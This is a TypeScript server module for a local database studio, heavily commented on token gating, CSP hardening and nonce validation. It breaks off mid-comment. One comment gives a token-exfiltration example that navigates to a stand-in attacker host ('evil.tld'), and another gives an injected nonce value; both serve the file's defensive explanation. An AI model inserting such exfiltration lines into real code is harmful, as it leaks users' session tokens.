/**
 * quick-studio Core — HTTP server (Ring 1).
 *
 * Binds loopback `127.0.0.1` by default; a `host` override (from `QS_HOST`) may
 * widen the bind to a concrete IP or a wildcard, which flips `Core.exposed` and
 * fires the Port-Exposure Warning on both surfaces. Serves the React UI with the
 * per-boot session token injected into the HTML, and exposes a single gated
 * `POST /rpc` endpoint.
 *
 * `/rpc` is rejected (HTTP 403 + error envelope) when the `X-QS-Token` header is
 * missing/wrong OR the Origin/Host is foreign. Only then is the request handed
 * to the RPC dispatcher. The token — not loopback — is the real gate (AD-12).
 */

import type { ChatStreamChunk, ConnectResult, ExposureInfo, RpcReply, TableRowsResult } from "../shared/contract.ts";
import { errorReply, okReply } from "../shared/contract.ts";
import { assembleLiveReportHtml } from "../shared/live-report-html.ts";
import { isUsableSandboxOrigin } from "../shared/sandbox-origin.ts";
import { resolveModel } from "./ai-provider.ts";
import { mintCspNonce, mintSessionToken, validateOrigin, validateToken } from "./auth.ts";
import { deriveOpenUrl, isExposed, resolveBindHost } from "./binding.ts";
import { createChatResponder } from "./chat.ts";
import { createConnectionManager, NoConnectionTargetError } from "./connection.ts";
import { createConnectionRegistry } from "./connection-registry.ts";
import { createConnectionTargets, targetError } from "./connection-targets.ts";
import type { DriverFactory } from "./driver.ts";
import { createExecutor } from "./executor.ts";
import { rowsToFrozenData } from "./frozen-map.ts";
import { createLiveReportRegistry } from "./live-report-registry.ts";
import { liveReportBundle } from "./live-report-bundle.generated.ts";
import { resolvePassphraseProvider, type PassphraseProvider } from "./passphrase-provider.ts";
import { createProviderRegistry } from "./provider-registry.ts";
import { DEFAULT_RUN_MODE, type RunMode } from "./run-mode.ts";
import { dispatch, type RpcContext } from "./rpc.ts";
import { sandboxBundle } from "./sandbox-bundle.generated.ts";
import { snapshotBundle } from "./snapshot-bundle.generated.ts";
import { startSandboxServer, type SandboxServer, type StartSandboxServerOptions } from "./sandbox-server.ts";
import { planTableRows, readTotal } from "./table-rows.ts";
import { uiBundle } from "./ui-bundle.generated.ts";
import { createWorkspaceRegistry } from "./workspace-registry.ts";

const TOKEN_HEADER = "x-qs-token";

// Content-Length hardening guard: reject an over-limit POST body (413) BEFORE
// `req.json()` buffers it whole into memory. Shared by both POST endpoints.
const MAX_REQUEST_BODY_BYTES = 8 * 1024 * 1024; // 8 MiB

export type Core = {
  readonly url: string;
  readonly host: string;
  readonly port: number;
  /** Per-boot session token (in-memory only; never log or persist). */
  readonly token: string;
  /**
   * True when the bind host is non-loopback (reachable off-machine). `bin/`
   * emits the loud stderr Port-Exposure Warning when this is set; the UI shows
   * the in-page banner via the injected `window.__QS_EXPOSURE__` global.
   */
  readonly exposed: boolean;
  /**
   * Selected run mode (Ephemeral vs Persistent). Threaded from `bin/` via the
   * CLI decision; the future credential-store call site inherits this gate so
   * Ephemeral stays a hard no-write guarantee.
   */
  readonly mode: RunMode;
  /**
   * Navigable, gate-passing URL for browser-open — distinct from `url`, which is
   * the bind host verbatim (e.g. `http://0.0.0.0:…` under a wildcard bind).
   * Wildcard binds are mapped to a loopback address; port 80 is omitted.
   */
  readonly openUrl: string;
  /**
   * The Ring 3 sandbox origin (Story 5.5): a SEPARATE `Bun.serve` on a distinct
   * ephemeral port, bound to LOOPBACK — NOT to the same host as Core when the Core is
   * exposed (DW-48; `startSandboxServer` clamps it, see there for why a tokenless origin
   * must never be LAN-reachable). The clamp lives in that factory, so the guarantee holds
   * for every real boot but is NOT enforced here: a caller that injects its own
   * `StartCoreOptions.startSandboxServer` supplies this origin unchecked. Ring 2 points the untrusted
   * `sandbox="allow-scripts"` iframe `src` at this origin (also injected into the
   * served HTML as `window.__QS_SANDBOX_ORIGIN__`). Torn down by `stop()`.
   */
  readonly sandboxOrigin: string;
  /** Stop the server (and the sandbox server) and release both ports. May be awaited. */
  stop(): void | Promise<void>;
};

const jsonHeaders = {
  "content-type": "application/json; charset=utf-8",
  "x-content-type-options": "nosniff",
} as const;

/**
 * Headers for the token-bearing HTML shell. `no-store` keeps the embedded
 * per-boot token out of the browser's on-disk cache (it must live in memory
 * only); `nosniff` prevents content-type confusion.
 */
const htmlHeaders = {
  "content-type": "text/html; charset=utf-8",
  "cache-control": "no-store",
  "x-content-type-options": "nosniff",
} as const;

/**
 * Headers for the token-bearing served Live Report page (`/live/<id>`). Extends the HTML-shell
 * headers with a REAL HTTP anti-framing guard. The page's `<meta>` CSP carries
 * `frame-ancestors 'none'`, but per the CSP spec that directive (like `sandbox`/`report-uri`)
 * is silently ignored when delivered via `<meta>` — it is effective only as an HTTP response
 * header. Since this is the one page that actually injects the per-boot session token AND can
 * `POST /rpc`, the clickjacking guard the CSP asserts must be delivered here: `X-Frame-Options`
 * for universal support plus a header-level `frame-ancestors 'none'` for modern browsers.
 */
const liveHtmlHeaders = {
  ...htmlHeaders,
  "x-frame-options": "DENY",
  "content-security-policy": "frame-ancestors 'none'",
} as const;

/**
 * The deny-by-default FLOOR of the app-shell CSP (DW-2) — the first directive
 * `shellCspHeaders` emits, before the two boot-dependent ones (`script-src`,
 * `frame-src`) and the narrowing directives that follow.
 *
 * `default-src 'self'` — every fetch the shell makes is same-origin (`/app.js`,
 * `/app.css`, `/rpc`, `/chat/stream`, `/snapshot-runtime.js`, `/live-report-runtime.js`);
 * nothing in the UI ever reaches off-machine, which is the R5 product guarantee restated
 * as a browser-enforced control. Everything the policy adds after this line is either a
 * directive that cannot usefully inherit the floor (`script-src` needs the nonce,
 * `frame-src` needs the cross-port sandbox origin) or a deliberate NARROWING of it —
 * never a widening. Each of those constants carries the reasoning for its own
 * directives, so an editor loosening one reads why it is tight before touching it.
 */
const SHELL_CSP_FLOOR_DIRECTIVE = "default-src 'self'";

/**
 * The resource directives that sit between `script-src` and `frame-src`, each narrowing
 * the `default-src 'self'` floor. Verified against an inventory of what Ring 2 actually
 * loads:
 *
 * - `style-src 'self' 'unsafe-inline'` — unavoidable, and deliberately chosen over the
 *   tighter `style-src 'nonce-…'; style-src-attr 'unsafe-inline'` split. Ring 2 sets 47
 *   React `style={{…}}` props plus 4 direct `.style.x =` writes, which produce style
 *   ATTRIBUTES that a nonce can never cover; and three separate libraries inject
 *   `<style>` elements at runtime (CodeMirror's `style-mod`, `react-resizable-panels`'
 *   cursor style, Radix's `react-style-singleton` scroll-lock). Nonce-ing those would
 *   mean wiring the value through three different injector APIs, and missing any one
 *   silently breaks editor theming / panel resize / dialog scroll-lock. Note the CSP
 *   spec IGNORES `'unsafe-inline'` in a directive that also carries a nonce or hash —
 *   so `style-src` deliberately carries neither, or this value would be inert.
 *   CSS injection is a far weaker primitive than script injection, and `connect-src`
 *   + `img-src` below close the exfiltration channels CSS could otherwise open.
 * - `img-src 'self' data:` — CodeMirror's base theme paints `.cm-highlightTab` with a
 *   `url('data:image/svg+xml,…')` background. `data:` is safe to admit for images: it
 *   cannot originate a network request, so it is not an egress channel. Crucially this
 *   directive omits `https:` (and `http:`) entirely, which is what actually blocks a
 *   stored-XSS in rendered DB content from beaconing data out via a remote `<img src>`
 *   — the guard `report-markdown.ts` used to carry alone. Adding ANY remote scheme here
 *   reopens a no-gesture, fire-and-forget egress channel that no other directive covers.
 * - `font-src 'self'` — the UI ships system font stacks only; the built CSS contains
 *   zero `@font-face`, so no remote font origin is needed.
 * - `connect-src 'self'` — pins every `fetch`/XHR/`EventSource`/WebSocket to the Core
 *   origin. Precisely what this does and does NOT close: it shuts the SCRIPTED-REQUEST
 *   channels, so an injected script that reads `window.__QS_TOKEN__` cannot POST, beacon
 *   or stream it to a remote host in the background. It does NOT close scripted
 *   NAVIGATION — `location.href = "https://evil.tld/?t=" + token`, `window.open(…)`, or
 *   a synthesized `<a>` click still carry the value off-machine, because the `navigate-to`
 *   directive was dropped from CSP before it ever shipped and `form-action` covers form
 *   submissions only, not script-driven navigation. That residual is recorded and
 *   accepted: it is the app-shell twin of the one this project already accepted for the
 *   Ring 3 sandbox in DW-47 (scripted same-frame navigation defeating `connect-src
 *   'none'`), on the same grounds. What the directive still buys is real and is the
 *   reason it stays: it converts SILENT background exfiltration into a visible top-level
 *   navigation the user watches happen — a much higher bar, and an observable one.
 */
const SHELL_CSP_RESOURCE_DIRECTIVES = [
  "style-src 'self' 'unsafe-inline'",
  "img-src 'self' data:",
  "font-src 'self'",
  "connect-src 'self'",
].join("; ");

/**
 * The hard denials + framing guard that close the policy, after `frame-src`:
 *
 * - `worker-src 'none'` / `object-src 'none'` / `form-action 'none'` — this UI renders
 *   no `<form>`, no `<object>`/`<embed>`, and constructs no `Worker`. What that claim
 *   rests on, precisely, because it is the justification for three security directives:
 *   `new Worker`/`new SharedWorker` appear nowhere in `src/` or in the built
 *   `ui-bundle.generated.ts`, and no `<form>`/`<object>`/`<embed>` element is authored
 *   in `src/`. Grepping the BUILT bundle for those tag names is NOT a check that
 *   reproduces this: it returns hits from React-DOM's internal tag tables and Radix's
 *   `NODES` primitive list, which are element names the library knows about, not
 *   elements this app renders. Denying them costs nothing and removes three
 *   classic CSP-bypass primitives (a worker inherits no nonce requirement, a plugin
 *   document escapes the policy, a form POST is an exfil channel `connect-src` does
 *   not reach).
 * - `base-uri 'none'` — without it an injected `<base href>` silently repoints every
 *   relative URL in the document (including `/app.js`) off-origin, defeating `'self'`.
 * - `frame-ancestors 'none'` — the shell injects the per-boot session token and can
 *   `POST /rpc`, so it must be un-framable. Delivered as an HTTP HEADER, never `<meta>`:
 *   per spec `frame-ancestors` is silently DROPPED from a `<meta>`-delivered policy
 *   (the recorded Story 6.4 lesson). `x-frame-options: DENY` rides along for the same
 *   guarantee on browsers that predate `frame-ancestors`.
 */
const SHELL_CSP_TRAILING_DIRECTIVES = [
  "worker-src 'none'",
  "object-src 'none'",
  "base-uri 'none'",
  "form-action 'none'",
  "frame-ancestors 'none'",
].join("; ");

/**
 * Exactly the shape {@link mintCspNonce} emits: 32 lowercase hex chars (128 bits).
 * Anchored, fixed-length, lowercase-only — a nonce that is merely hex-ISH is not a
 * nonce this codebase minted, and is treated as garbage.
 */
const CSP_NONCE_RE = /^[0-9a-f]{32}$/;

/**
 * The SINGLE gate every CSP-nonce consumer goes through: returns `nonce` unchanged when
 * it is exactly what {@link mintCspNonce} produces, and `""` for anything else.
 *
 * All-or-nothing on purpose. The obvious alternative — strip non-hex characters and use
 * whatever survives — fails open in the ugliest way: `"ab;evil cd"` filters down to
 * `"abecd"`, which is a perfectly well-FORMED `'nonce-abecd'` source carrying ~20 bits
 * of entropy. The policy would look valid, the page would work, and the nonce would be
 * brute-forceable. Only the fully-destroyed input hit the fail-closed branch, i.e. the
 * corner that mattered least. Rejecting anything that is not a full-width minted nonce
 * means a partially-mangled value degrades to "inline scripts are refused" (blank UI,
 * safe) instead of "inline scripts are admitted on a guessable token" — and `startCore`
 * emits a `console.warn` on that branch so the degraded boot is loud on the server side
 * rather than only in a browser console nobody has open.
 *
 * Both `shellCspHeaders` (the `'nonce-…'` source) and `renderIndexHtml` (the `nonce="…"`
 * attribute) call THIS function and nothing else, which is what makes "header and body
 * can never disagree" true by construction rather than by two copies of a regex staying
 * in sync. (The separate hex filter on the session TOKEN in `renderIndexHtml` is a
 * different concern and stays where it is.)
 */
function safeCspNonce(nonce: string): string {
  return CSP_NONCE_RE.test(nonce) ? nonce : "";
}

/**
 * Build the app-shell response headers (DW-2): the strict per-boot CSP plus the
 * existing `no-store` / `nosniff` / content-type contract, and an `x-frame-options:
 * DENY` companion to `frame-ancestors 'none'`.
 *
 * Pure and exported so the exact header set — including both fail-closed corners — is
 * unit-testable without booting a server, mirroring `sandboxCspHeaders()` in
 * `sandbox-server.ts`. This is the ONE place that owns the shell policy; the ordering
 * of directives mirrors `GUEST_CSP` so the two policies read side by side. The
 * directive-by-directive rationale lives on the three constants above, next to the
 * directives it explains.
 *
 * Two boot-dependent directives are spliced in, both FAIL CLOSED — a malformed input
 * must never produce a syntactically invalid CSP, because a browser that cannot parse
 * a directive may drop it (or the whole policy) and silently restore ambient authority:
 *
 * - `script-src 'self' 'nonce-<hex>'`. The nonce goes through {@link safeCspNonce},
 *   which admits ONLY a full 32-char lowercase-hex value — the exact output of
 *   `mintCspNonce`. Anything else (partial, short, long, non-hex, injected `;`) yields
 *   `""` and we emit a bare `script-src 'self'`: no `'nonce-'` source at all, rather
 *   than a low-entropy source an attacker could guess or the malformed `'nonce-'` token
 *   an empty interpolation would give. `renderIndexHtml` calls the same helper and
 *   correspondingly omits the `nonce` attribute, so header and body always agree — and
 *   the degraded outcome is the strictly safer one (external same-origin scripts still
 *   load; inline scripts are simply refused). Note `'unsafe-eval'` is deliberately
 *   absent: there is no `eval`, `new Function`, or `Function("…")` anywhere in
 *   `src/ui`, `src/shared`, `src/core`, or the built bundle (this UI runs CodeMirror 6,
 *   not Monaco, and micromark, not MDX).
 * - `frame-src <sandboxOrigin>`. The Ring 3 sandbox lives on a DIFFERENT loopback
 *   PORT — and, under an exposed Core, a different HOST too, since it clamps to loopback
 *   while Core does not (DW-48) — hence a different origin, so `default-src 'self'` would block the iframe and
 *   break the whole Ring 2 -> Ring 3 loop. The decision comes from the shared
 *   `shared/sandbox-origin.ts`, which is the point: `isUsableSandboxOrigin` is the same
 *   function `renderIndexHtml` runs before injecting `window.__QS_SANDBOX_ORIGIN__` and
 *   the same one `buildSandboxIframeAttrs` gates the iframe `src` on — one rule applied
 *   to one raw value, not regexes kept in sync, so the header, the injected global and
 *   the frame cannot reach different verdicts. It is accept-or-reject, never repair: no
 *   character filter runs first, because a filter that strips its way to a valid origin
 *   makes all three agree on a host the input never named (see that module's docstring).
 *   The gate demands a real `scheme://host` authority, because the hostless
 *   (`"http://"`, `"http:///x"`) and empty-host (`"http://:1234"`) forms would emit
 *   sources like `frame-src http://` that are not source expressions at all, and it
 *   admits no `;`, space or quote, so a value can never split `frame-src` into a second,
 *   forged directive. When the gate fails the iframe falls back to `about:blank`
 *   (which inherits the embedder's policy and needs no source), so we emit
 *   `frame-src 'none'` — never an empty or dangling source token. `child-src` is NOT
 *   emitted as a fallback: every browser that understands nonces also understands
 *   `frame-src`, and a second copy of the sandbox origin inside a security control is a
 *   drift hazard, not a safety net.
 *
 *   RESIDUAL (IPv6 binds). On `QS_HOST=::1` / `::`, `deriveOpenUrl` yields
 *   `http://[::1]:<port>` and that bracketed literal flows verbatim into `frame-src`.
 *   CSP3's `host-part` grammar admits ALPHA / DIGIT / `-` only, so a bracketed IPv6
 *   literal is formally OUTSIDE it, even though Chromium and Gecko both accept it in
 *   practice. We emit it anyway and deliberately do not "fix" it: the value MUST stay
 *   byte-identical to the iframe's `src` or the frame is blocked for a different
 *   reason, and CSP has no portable alternative spelling for an IPv6 origin (there is
 *   no source expression that means "this one host"; the only wider options are a
 *   scheme source or `*`, both of which would be a real loosening). A spec-strict
 *   browser therefore refuses the Ring 3 iframe on an IPv6 bind — the failure mode is
 *   a blank preview pane, never a security hole: it fails CLOSED. The default loopback
 *   bind is IPv4, so this is off the common path entirely.
 */
export function shellCspHeaders(nonce: string, sandboxOrigin: string): Record<string, string> {
  const safeNonce = safeCspNonce(nonce);
  const scriptSrc =
    safeNonce.length > 0 ? `script-src 'self' 'nonce-${safeNonce}'` : "script-src 'self'";

  // The SAME gate `renderIndexHtml` and `buildSandboxIframeAttrs` call (not a copy of
  // it), on the SAME raw value, so the origin admitted here is byte-identical to the one
  // injected into the shell and to the one the iframe is actually pointed at.
  const frameSrc = isUsableSandboxOrigin(sandboxOrigin)
    ? `frame-src ${sandboxOrigin}`
    : "frame-src 'none'";

  // Order mirrors `GUEST_CSP`: floor, script, resources, frame, then the hard
  // `'none'` denials and the framing guard.
  const policy = [
    SHELL_CSP_FLOOR_DIRECTIVE,
    scriptSrc,
    SHELL_CSP_RESOURCE_DIRECTIVES,
    frameSrc,
    SHELL_CSP_TRAILING_DIRECTIVES,
  ].join("; ");

  return {
    ...htmlHeaders,
    "content-security-policy": policy,
    // `frame-ancestors 'none'` is the modern control; `X-Frame-Options` is its
    // universally-supported twin. Both, for the same reason `liveHtmlHeaders` sets
    // both: this page carries the session token and must never be framed.
    "x-frame-options": "DENY",
  };
}

/** Options controlling `startCore`'s behavior beyond the default binding. */
export type StartCoreOptions = {
  /**
   * Invoked (async, on a post-flush macrotask) when the `shutdown` RPC fires.
   * Defaults to `server.stop(true)` so `startCore` stays self-contained and
   * import-safe for `bun test` — it never reaches `process.exit` on its own.
   * `bin/` overrides this with the shared shutdown controller so the UI path
   * also exits the process.
   */
  onShutdownRequested?: () => void;
  /**
   * Bind host. Defaults to loopback `127.0.0.1`. A non-loopback value (concrete
   * IP or a wildcard `0.0.0.0` / `::`) makes the Core reachable off-machine and
   * flips `Core.exposed` on. `bin/` resolves this from `QS_HOST`.
   */
  host?: string;
  /**
   * Selected run mode. Defaults to Persistent. `bin/` passes the CLI-resolved
   * mode; Ephemeral means no disk writer is ever engaged for this session.
   */
  mode?: RunMode;
  /**
   * The in-memory Ephemeral database URL (from `bin/` via `parseCliArgs`). Held
   * only in the Core's connection-manager closure — never persisted, never logged,
   * never surfaced on `Core`. Absent ⇒ `connect` reports "no connection target".
   */
  databaseUrl?: string;
  /**
   * Driver factory for the connection manager. Defaults to the real scheme-
   * selecting `createDriver`; tests inject a fake so `connect` never needs a live
   * Postgres/MySQL (the DI testability seam).
   */
  createDriver?: DriverFactory;
  /**
   * Sandbox-origin server factory. Defaults to the real `startSandboxServer`; tests
   * inject a fake to exercise teardown ordering (e.g. a `stop` that rejects). The DI
   * testability seam, mirroring `createDriver`.
   */
  startSandboxServer?: (options: StartSandboxServerOptions) => SandboxServer;
  /**
   * Pre-resolved passphrase provider (Story 11.6). Defaults to
   * `resolvePassphraseProvider(process.env)` — today's env/fd behavior, byte-for-
   * byte unchanged. `bin/`'s first-run pre-flight (`first-run-setup.ts`) prompts
   * interactively BEFORE calling `startCore` and passes a
   * `staticPassphraseProvider(passphrase)` closure here when it captured an
   * answer, so the ONE-provider-per-boot invariant below still holds: whichever
   * instance is resolved — the default or this override — is the single instance
   * shared by BOTH persistent stores.
   */
  passphraseProvider?: PassphraseProvider;
  /**
   * First-run boot signal (Story 11.7), pre-computed by `bin/` via
   * `isFirstRunBoot` BEFORE the Story 11.6 pre-flight can create the app-data
   * directory (or, on the passphrase-create path, the descriptor and `.enc`).
   * Purely a UI-routing/messaging hint — it never changes what boots (Persistent
   * still boots Persistent either way). Defaults to `false`, matching every
   * existing call site's byte-for-byte behavior.
   */
  firstRun?: boolean;
};

function jsonResponse(body: unknown, status: number): Response {
  return new Response(JSON.stringify(body), { status, headers: jsonHeaders });
}

/**
 * True when the request self-declares a `content-length` over the limit — a cheap
 * size check to reject before `req.json()` buffers the body. Coercion corners:
 * an ABSENT header is `Number(null)` → `0` (proceeds); a non-numeric or duplicate
 * (comma-joined) header is `NaN` (proceeds — an out-of-scope undercount); a huge
 * all-digit value overflows to `Infinity`, which is `> MAX` and IS rejected — the
 * guard must not leave a hole at the very top of the range. Only `NaN` is excused.
 */
export function overBodyLimit(req: Request): boolean {
  const len = Number(req.headers.get("content-length"));
  return !Number.isNaN(len) && len > MAX_REQUEST_BODY_BYTES;
}

/**
 * The shared `413` reject for an over-limit body, or `null` to proceed. Both POST
 * endpoints call this right after their gates and before `await req.json()`, so
 * the limit and its user-facing message (derived from the constant, never a drifting
 * literal) live in exactly one place.
 */
function bodyLimitResponse(req: Request): Response | null {
  if (!overBodyLimit(req)) return null;
  const mib = Math.floor(MAX_REQUEST_BODY_BYTES / (1024 * 1024));
  return jsonResponse(errorReply("bad_request", `Request body exceeds the ${mib} MiB limit`), 413);
}

/**
 * Serialize a value for safe embedding inside an inline `<script>`: JSON, then
 * escape `<` (blocks `</script>` breakout) and the U+2028/U+2029 line separators
 * (valid JS string terminators that some parsers honour inside inline scripts).
 * Unlike the token — which `renderIndexHtml` filters to hex before injecting —
 * the exposure `host` is the arbitrary `QS_HOST` value, so this escaping is what
 * actually keeps that untrusted field from breaking out of the script element.
 */
function scriptJson(value: unknown): string {
  // Escape `<` (blocks `</script>`) and the U+2028/U+2029 line separators
  // (valid JS string terminators inside inline scripts) via \u escapes.
  return JSON.stringify(value).replace(/[\u003c\u2028\u2029]/g, (c) =>
    "\\u" + c.charCodeAt(0).toString(16).padStart(4, "0"),
  );
}

/**
 * Render the served HTML shell with the per-boot token injected. The UI reads
 * `window.__QS_TOKEN__` and sends it on every `/rpc` call, reads
 * `window.__QS_EXPOSURE__` (known at boot, static) to render the Port-Exposure
 * Warning banner, reads `window.__QS_SANDBOX_ORIGIN__` (Story 5.5) to point the
 * untrusted iframe `src` at the Ring 3 origin, and reads `window.__QS_FIRST_RUN__`
 * (Story 11.7) to route the initial Tab onto Settings -> connections instead of an
 * empty tree. The token is hex-filtered belt-and-suspenders; the sandbox origin is
 * URL-charset-filtered the same way; the exposure payload (arbitrary `host`) leans
 * on `scriptJson`'s `<script>`-safe escaping; `firstRun` is a plain boolean with no
 * untrusted content to escape. Exported for unit-testing the injection without
 * booting a real server.
 *
 * `nonce` is the per-boot CSP nonce (DW-2) and MUST be the same value
 * `shellCspHeaders` puts in the response header's `script-src 'nonce-…'` source: all
 * four of these scripts are INLINE, so under the strict shell CSP they execute only
 * if they carry it — and without them the UI has no token, no exposure banner, and no
 * sandbox origin, i.e. a blank app. It is validated here by the SAME
 * {@link safeCspNonce} helper the builder calls — one function, one rule, so the two
 * cannot disagree by construction (not by two copies of a regex being kept in sync).
 * When the helper rejects the value the `nonce` attribute is omitted ENTIRELY rather
 * than emitted empty, matching the builder's matching omission of the `'nonce-'`
 * source. That is the fail-closed pairing: a malformed nonce degrades to "inline
 * scripts are refused", never to "a malformed policy the browser may discard
 * wholesale" and never to "a live but low-entropy nonce".
 *
 * The `/app.js` module tag needs no nonce: it is an external same-origin script and is
 * already admitted by `script-src 'self'`.
 */
export function renderIndexHtml(
  token: string,
  exposure: ExposureInfo,
  sandboxOrigin: string,
  nonce: string,
  firstRun = false,
): string {
  const safeToken = token.replace(/[^0-9a-fA-F]/g, "");
  // The SHARED gate (not a copy of it), on the raw value — the same function, given the
  // same input, that `shellCspHeaders` emits `frame-src` from and that
  // `buildSandboxIframeAttrs` points the iframe with. Accept-or-reject, never repair:
  // anything the gate refuses is injected as `""`, which Ring 2 renders as
  // `about:blank`, so the global, the header and the frame fail closed together. An
  // accepted origin needs no escaping of its own (the gate's charset carries no `<`,
  // `>`, quote or `;`), and `scriptJson` escapes it anyway.
  const safeSandboxOrigin = isUsableSandboxOrigin(sandboxOrigin) ? sandboxOrigin : "";
  // The SAME gate `shellCspHeaders` uses (not a copy of it), and the same fail-closed
  // empty case: no attribute at all rather than `nonce=""`, which would be an attribute
  // an injected script could trivially replicate. Note the token's hex FILTER above is
  // a separate concern — the token is a value to sanitize, the nonce is a value to
  // accept or reject outright.
  const safeNonce = safeCspNonce(nonce);
  const nonceAttr = safeNonce.length > 0 ? ` nonce="${safeNonce}"` : "";
  return `<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>quick-studio</title>
    <link rel="stylesheet" href="/app.css" />
    <script${nonceAttr}>window.__QS_TOKEN__ = ${scriptJson(safeToken)};</script>
    <script${nonceAttr}>window.__QS_EXPOSURE__ = ${scriptJson(exposure)};</script>
    <script${nonceAttr}>window.__QS_SANDBOX_ORIGIN__ = ${scriptJson(safeSandboxOrigin)};</script>
    <script${nonceAttr}>window.__QS_FIRST_RUN__ = ${scriptJson(firstRun)};</script>
  </head>
  <body>
    <div id="root"></div>
    <script type="module" src="/app.js"></script>
  </body>
</html>
`;
}

/**
 * Boot the Core: mint a token, bundle the UI, and start `Bun.serve` on the
 * resolved bind host (loopback `127.0.0.1` by default; a non-loopback host makes
 * the instance reachable off-machine and sets `Core.exposed`). Pass `port: 0`
 * for an ephemeral port. Resolves once listening.
 */
export async function startCore(port = 0, options: StartCoreOptions = {}): Promise<Core> {
  const token = mintSessionToken();
  // The app-shell CSP nonce (DW-2), minted alongside the token because it shares the
  // token's lifecycle exactly: one value per boot, in memory only, never logged, never
  // persisted, and never surfaced on the returned `Core`. The shell HTML is a
  // boot-time template served `no-store`, so a single nonce covers every request of
  // this boot and dies with the process.
  const cspNonce = mintCspNonce();
  // Single normalization path shared with `bin/` (trim + lower-case + loopback
  // default), so classification, the bound hostname, and the `validateOrigin`
  // authority all agree — a direct `startCore({ host })` caller cannot bind a
  // padded/mixed-case host that would silently 403 every RPC.
  const bindHost = resolveBindHost(options.host);
  const exposed = isExposed(bindHost);
  const mode = options.mode ?? DEFAULT_RUN_MODE;
  const { js: appJs, css: appCss } = uiBundle;

  // Core-owned connection manager: holds the in-memory URL, opens the driver
  // lazily+once on the first `connect` RPC, and is closed in `stop()`. The URL
  // lives only in this closure — never on `Core`, never logged.
  const connectionManager = createConnectionManager({
    databaseUrl: options.databaseUrl,
    createDriver: options.createDriver,
  });

  // Manage-connections registry (Story 2.4): the sole credential-store holder for
  // the Settings surface. Constructed once and gated by the run mode — the store
  // is NOT opened at boot; the registry opens it lazily on the first RPC call so
  // Ephemeral stays a hard no-write (its store open is a pure in-memory no-op).
  // ONE passphrase provider shared by BOTH persistent stores. When the keychain-less
  // fallback reads its secret from a file descriptor (`QS_PASSPHRASE_FD`), that fd is
  // a single-read stream: the first store to open drains it to EOF, so a second
  // provider instance would read `""` → decline and starve the second store. A single
  // memoized provider reads the fd at most once and serves the captured passphrase to
  // both the connection and provider-key registries (and to any retry within a store).
  //
  // `options.passphraseProvider` (Story 11.6) is the pre-flight's pre-resolved
  // closure when `bin/` already prompted interactively before this boot; absent,
  // this resolves EXACTLY as before. Either way it is still resolved ONCE, here,
  // and this single instance is what flows into both registries below.
  const passphraseProvider = options.passphraseProvider ?? resolvePassphraseProvider(process.env);

  const connectionRegistry = createConnectionRegistry({
    storeDeps: { mode, passphraseProvider },
  });

  // Workspace-state registry (Story 2.5): the sole Workspace-store holder for
  // `workspace.load`/`workspace.save`. Same lazy-open, mode-gated posture as
  // `connectionRegistry` — Ephemeral stays a hard no-write (the store's open is a
  // pure in-memory no-op, never touching the app dir).
  const workspaceRegistry = createWorkspaceRegistry({ storeDeps: { mode } });

  // AI provider-key registry (Story 5.1): the sole provider-key-store holder for
  // the AI-providers Settings surface. Same lazy-open, mode-gated posture as the
  // connection registry — Ephemeral stays a hard no-write (its store open is a pure
  // in-memory no-op), and the raw key never leaves Ring 1 (summaries are secret-free).
  const providerRegistry = createProviderRegistry({
    storeDeps: { mode, passphraseProvider },
  });

  // Live Report registry (Story 6.4): holds published layout+SQL docs (never data, never a
  // credential, never a token) so the Core can serve them same-origin at `/live/<id>`. In-memory
  // + session-only — nothing touches disk (Persistent/Ephemeral-agnostic), and it dies with boot.
  const liveReportRegistry = createLiveReportRegistry();

  // Per-target connection resolver (Story 6.2, generalized in Story 10.4): turns an
  // optional saved-connection id into the seams a read path runs over. The default (id
  // null/absent) is the boot manager, so the untargeted path is byte-identical. A target
  // manager is created lazily via the SAME driver factory, cached by id, self-invalidated
  // against the registry's `getStoredUrl` on every resolve (repoint/re-scope/removal), and
  // closed on shutdown. Only the id crosses the loopback — the url is resolved in-Core
  // here, and `execute`, `table.rows`, `connect` and chat all share THIS one pool.
  const connectionTargets = createConnectionTargets({
    bootManager: connectionManager,
    getStoredUrl: (id) => connectionRegistry.getStoredUrl(id),
    createManager: (url, schema) =>
      createConnectionManager({ databaseUrl: url, schema, createDriver: options.createDriver }),
  });

  /**
   * Read an optional `connectionId` off an unvalidated `params`, shape-checked BEFORE any
   * connection round-trip (mirroring `executor.ts`'s `execute`), so a malformed id is a
   * `bad_request` that never opens or touches a driver. Absent/`null` ⇒ `null`, which
   * `connectionTargets.resolve` maps to the boot manager — the byte-identical default.
   * `method` names the offending RPC in the message, matching the executor's wording.
   *
   * A `params` that is PRESENT but not a plain object (a string, number, boolean, array)
   * is itself a protocol violation and is rejected here, exactly as `executor.ts`'s
   * `execute` rejects a non-object request. Treating it as "no id" instead — the old
   * behavior — silently answered `{"method":"connect","params":"conn-b"}` with the BOOT
   * connection's schema and `ok:true`, i.e. a targeted read served from the wrong
   * database with no error at all. Absent/`null` `params` is NOT a violation: it is how
   * the UI's paramless `connect` calls, which must stay byte-identical.
   */
  function readConnectionId(
    params: unknown,
    method: string,
  ): { id: string | null } | { error: RpcReply<never> } {
    if (params !== undefined && params !== null && (typeof params !== "object" || Array.isArray(params))) {
      return { error: errorReply("bad_request", `${method} requires a params object`) };
    }
    const p = (params ?? null) as Record<string, unknown> | null;
    const raw = p?.connectionId;
    if (raw !== undefined && raw !== null && typeof raw !== "string") {
      return { error: errorReply("bad_request", `${method} 'connectionId' must be a string or null`) };
    }
    return { id: raw ?? null };
  }

  /**
   * Browse-rows capability (Story 3.2; targeted in Story 10.4): resolve the requested
   * connection (absent/`null` id ⇒ the boot manager), validate the request against THAT
   * target's live introspected schema, compose the Core-owned read-only SELECT/COUNT
   * (identifiers schema-validated + `quoteIdent`-quoted, LIMIT/OFFSET integer literals),
   * run both on it, and map the page to `FrozenData`. A validation failure is a formed
   * `bad_request`/`not_found` reply — target selection changes WHICH schema is validated
   * against, never the validation contract. An unresolvable id is the shared
   * `targetError` mapping (`not_found`/`internal_error`, credential-neutral). No
   * connection target configured (`NoConnectionTargetError`) is caught and returned as a
   * neutral `bad_request` "no active connection" — NOT the generic `internal_error`. Any
   * OTHER driver/connection throw still propagates → `internal_error` (engine-neutral,
   * credentials never echoed).
   *
   * SNAPSHOT CAVEAT (DW-32) — accepted, not a bug to fix here: the COUNT and the page
   * SELECT below are TWO independent round-trips with NO shared snapshot and NO
   * enclosing transaction, so a concurrent writer between them makes the reply's `total`
   * describe a different instant than its rows. Under concurrent writes an OFFSET-based
